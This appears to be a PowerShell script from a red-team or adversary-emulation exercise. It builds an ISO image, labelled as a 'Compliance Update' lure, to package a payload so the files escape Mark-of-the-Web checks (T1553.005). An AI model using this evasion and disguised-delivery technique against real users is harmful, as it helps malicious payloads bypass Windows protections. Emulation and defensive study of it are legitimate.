<#
make_iso.ps1 - Build an ISO9660 + Joliet image from a folder using IMAPI2
               (built into Windows - no VS Build Tools, ADK, or xorriso needed).

The folder's contents are placed at the ISO root. Used to package the Step 1C
payload so the files inside lose Mark-of-the-Web when the image is mounted
(ISO9660 carries no NTFS alternate data streams, so Zone.Identifier cannot
propagate - see T1553.005 Mark-of-the-Web Bypass).

Usage:
    powershell -NoProfile -ExecutionPolicy Bypass -File make_iso.ps1 `
        -SourceDir .\iso_root `
        -IsoPath .\Essos_Compliance_Update.iso `
        -VolumeName "Compliance Update"

Parameters:
    -SourceDir    Folder whose contents become the ISO root (required)
    -IsoPath      Output .iso path (required)
    -VolumeName   Volume label (default "Compliance Update")
    -FileSystems  FsiFileSystems bitmask (default 3 = ISO9660 + Joliet).
                  1=ISO9660, 2=Joliet, 4=UDF. Do NOT use 7 unless required:
                  adding UDF inflates the image ~3x with no benefit here.
#>
param(
    [Parameter(Mandatory=$true)][string]$SourceDir,
    [Parameter(Mandatory=$true)][string]$IsoPath,
    [string]$VolumeName = "Compliance Update",
    [int]$FileSystems = 3
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path -LiteralPath $SourceDir -PathType Container)) {
    throw "SourceDir not found: $SourceDir"
}

if (Test-Path -LiteralPath $IsoPath) {
    Remove-Item -LiteralPath $IsoPath -Force
}

# IMAPI2 exposes the finished image as an IStream; pull it to disk via a small
# COM interop helper (PowerShell cannot marshal IStream methods by itself).
if (-not ("IsoStreamSaver" -as [type])) {
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

public static class IsoStreamSaver {
    public static void Save(object comStream, string path) {
        IStream stream = (IStream)comStream;
        using (FileStream fs = File.Create(path)) {
            byte[] buffer = new byte[65536];
            IntPtr readPtr = Marshal.AllocHGlobal(sizeof(int));
            try {
                while (true) {
                    stream.Read(buffer, buffer.Length, readPtr);
                    int read = Marshal.ReadInt32(readPtr);
                    if (read <= 0) break;
                    fs.Write(buffer, 0, read);
                }
            } finally {
                Marshal.FreeHGlobal(readPtr);
            }
        }
    }
}
"@
}

$fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
$fsi.FileSystemsToCreate = $FileSystems
$fsi.VolumeName = $VolumeName
$fsi.Root.AddTree((Resolve-Path -LiteralPath $SourceDir).Path, $false) | Out-Null

$result = $fsi.CreateResultImage()
[IsoStreamSaver]::Save($result.ImageStream, $IsoPath)

$info = Get-Item -LiteralPath $IsoPath
Write-Output ("[+] {0}  ({1:N0} bytes)" -f $info.FullName, $info.Length)
